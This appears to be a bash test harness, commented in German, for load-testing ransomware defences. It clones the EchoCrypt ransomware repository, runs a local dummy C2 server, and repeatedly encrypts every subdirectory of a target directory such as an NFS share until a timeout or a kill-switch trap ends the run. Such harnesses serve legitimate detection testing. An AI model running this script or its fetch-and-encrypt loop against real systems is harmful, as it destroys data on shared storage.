#!/bin/bash

# =================================================================
# RANSOMWARE EVALUATION HARNESS (Kugelsicherer Not-Aus)
# =================================================================

INSTALL_DIR="./EchoCrypt"
REPO_URL="https://github.com/Quema100/EchoCrypt.git"
SERVER_PID=""
LOAD_PID=""

if [ "$#" -ne 2 ]; then
    echo "Benutzung: $0 <ZIELVERZEICHNIS> <DAUER_IN_SEKUNDEN>"
    echo "Beispiel:  $0 /mnt/nfs/tmp 60"
    exit 1
fi

TARGET_DIR=$1
DURATION=$2

if [ ! -d "$TARGET_DIR" ]; then
    echo "[ERROR] Zielverzeichnis '$TARGET_DIR' existiert nicht!"
    exit 1
fi

echo "=== Ransomware Sustained Load Test ==="

# -----------------------------------------------------------------
# 0. ECHOCRYPT REPO SICHERSTELLEN
# -----------------------------------------------------------------
ensure_echocrypt_repo() {
    if [ -f "$INSTALL_DIR/test.py" ]; then
        echo "[INFO] EchoCrypt gefunden: $INSTALL_DIR"
        return 0
    fi

    if [ -d "$INSTALL_DIR" ] && [ ! -d "$INSTALL_DIR/.git" ]; then
        echo "[ERROR] '$INSTALL_DIR' existiert, ist aber kein Git-Repo und enthält kein test.py."
        echo "[ERROR] Bitte Ordner bereinigen/umbenennen oder manuell '$REPO_URL' nach '$INSTALL_DIR' klonen."
        return 1
    fi

    if [ -d "$INSTALL_DIR/.git" ]; then
        echo "[INFO] EchoCrypt-Repo vorhanden, aber unvollständig. Versuche Update..."
        git -C "$INSTALL_DIR" pull --ff-only >/dev/null 2>&1 || true
    else
        echo "[INFO] EchoCrypt nicht gefunden. Klone Repository nach '$INSTALL_DIR'..."
        git clone --depth 1 "$REPO_URL" "$INSTALL_DIR"
    fi

    if [ ! -f "$INSTALL_DIR/test.py" ]; then
        echo "[ERROR] EchoCrypt ist nach dem Klonen/Update unvollständig (test.py fehlt)."
        return 1
    fi

    echo "[OK] EchoCrypt bereit: $INSTALL_DIR"
}

ensure_echocrypt_repo

# -----------------------------------------------------------------
# 1. DER C2-DUMMY-SERVER
# -----------------------------------------------------------------
python3 -c "
from http.server import BaseHTTPRequestHandler, HTTPServer
class DummyC2(BaseHTTPRequestHandler):
    def do_POST(self):
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(b'{\"status\": \"success\"}')
    def log_message(self, format, *args): pass
HTTPServer(('127.0.0.1', 3000), DummyC2).serve_forever()
" &
SERVER_PID=$!

# -----------------------------------------------------------------
# 2. CLEANUP / NOT-AUS (Trap)
# -----------------------------------------------------------------
cleanup() {
    local reason="${1:-normal}"

    # Verhindert Mehrfach-Aufruf über verschachtelte Traps
    trap - INT TERM EXIT

    if [ "$reason" = "signal" ]; then
        echo -e "\n\n🚨🚨🚨 NOT-AUS WURDE AKTIVIERT 🚨🚨🚨"
        echo "[+] Stoppe alle zugehörigen Prozesse..."
    else
        echo -e "\n[INFO] Beende Testlauf und räume Prozesse auf..."
    fi

    # Dummy-C2 sauber beenden (kein "Killed"-Job-Noise)
    if [ -n "${SERVER_PID:-}" ] && kill -0 "$SERVER_PID" 2>/dev/null; then
        kill "$SERVER_PID" 2>/dev/null || true
        wait "$SERVER_PID" 2>/dev/null || true
    fi

    # Laufende Last in eigener Prozessgruppe stoppen (inkl. Unterprozesse)
    if [ -n "${LOAD_PID:-}" ] && kill -0 "$LOAD_PID" 2>/dev/null; then
        kill -TERM -- "-$LOAD_PID" 2>/dev/null || kill -TERM "$LOAD_PID" 2>/dev/null || true
        sleep 0.2
        kill -KILL -- "-$LOAD_PID" 2>/dev/null || kill -KILL "$LOAD_PID" 2>/dev/null || true
        wait "$LOAD_PID" 2>/dev/null || true
    fi

    # Direkte Kinder dieses Skripts stoppen
    pkill -TERM -P $$ 2>/dev/null || true
    sleep 0.2
    pkill -KILL -P $$ 2>/dev/null || true

    # Zur Sicherheit laufende EchoCrypt-Prozesse stoppen
    pkill -TERM -f "python3 test.py" 2>/dev/null || true
    sleep 0.2
    pkill -KILL -f "python3 test.py" 2>/dev/null || true

    if [ "$reason" = "signal" ]; then
        echo "[INFO] Alles gestoppt. Das Terminal gehört wieder dir!"
        exit 130
    fi
}

# NOT-AUS nur bei Signalen, normales Ende separat
trap 'cleanup signal' INT TERM
trap 'cleanup normal' EXIT

# -----------------------------------------------------------------
# 3. DIE ENDLOSSCHLEIFE
# -----------------------------------------------------------------
echo "[*] Ziel-Share: $TARGET_DIR"
echo "[!] Starte Verschlüsselung... Drücke STRG+C zum Abbrechen!"
echo "----------------------------------------------------------"

cd "$INSTALL_DIR" || exit 1

if command -v setsid >/dev/null 2>&1; then
    setsid timeout "${DURATION}s" bash -c "
    while true; do
        echo '[DEBUG] Suche nach Unterordnern...'
        
        find '$TARGET_DIR' -type d 2>/dev/null | while read -r SUBDIR; do
            echo \"[DEBUG] Führe EchoCrypt aus auf: \$SUBDIR\"
            python3 test.py --encrypt --target-dir \"\$SUBDIR\" > /dev/null 2>&1
        done
        
        sleep 1
    done
    " &
else
    timeout "${DURATION}s" bash -c "
    while true; do
        echo '[DEBUG] Suche nach Unterordnern...'
        
        find '$TARGET_DIR' -type d 2>/dev/null | while read -r SUBDIR; do
            echo \"[DEBUG] Führe EchoCrypt aus auf: \$SUBDIR\"
            python3 test.py --encrypt --target-dir \"\$SUBDIR\" > /dev/null 2>&1
        done
        
        sleep 1
    done
    " &
fi
LOAD_PID=$!
wait "$LOAD_PID" 2>/dev/null || true

# Das Skript erreicht diesen Punkt nur, wenn das Zeitlimit regulär abläuft
echo "----------------------------------------------------------"
echo "[INFO] Zeitlimit von $DURATION s erreicht."
